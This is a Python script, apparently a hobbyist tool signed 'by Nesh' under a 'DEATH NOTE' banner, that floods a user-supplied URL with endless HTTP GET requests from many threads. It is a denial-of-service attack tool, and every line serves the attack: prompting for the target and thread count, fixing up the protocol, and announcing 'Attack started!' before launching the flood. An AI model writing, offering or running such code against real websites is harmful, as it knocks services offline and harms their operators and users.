import requests
import threading
from colorama import init
from termcolor import colored
import urllib

init()


def dos(target):
    while True:
        try:
            res = requests.get(target, proxies=urllib.request.getproxies())
        except requests.exceptions.ConnectionError:
            print(colored("Connection Error!", color='green'))


print(colored("""
██████╗░███████╗░█████╗░████████╗██╗░░██╗   ███╗░░██╗░█████╗░████████╗███████╗
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║░░██║   ████╗░██║██╔══██╗╚══██╔══╝██╔════╝
██║░░██║█████╗░░███████║░░░██║░░░███████║   ██╔██╗██║██║░░██║░░░██║░░░█████╗░░
██║░░██║██╔══╝░░██╔══██║░░░██║░░░██╔══██║   ██║╚████║██║░░██║░░░██║░░░██╔══╝░░
██████╔╝███████╗██║░░██║░░░██║░░░██║░░██║   ██║░╚███║╚█████╔╝░░░██║░░░███████╗
╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝   ╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚══════╝""", color='yellow'))

print(colored("                                                                       by Nesh", color='green'))

threads = 20

print(colored("URL:", color='cyan'), end=' ')

url = input()

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    print("""\nSelect protocol:
1.HTTP
2.HTTPS""")
    a = str(input('>>'))
    if a == '1' or a.lower() == 'http':
        url = 'http://' + url
    if a == '2' or a.lower() == 'https':
        url = 'https://' + url

if not url.__contains__("http") and not url.__contains__("https"):
    exit('Invalid protocol specified')

if not url.__contains__("."):
    exit("Invalid domain")

print(colored("Attack started!", color='red'))

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
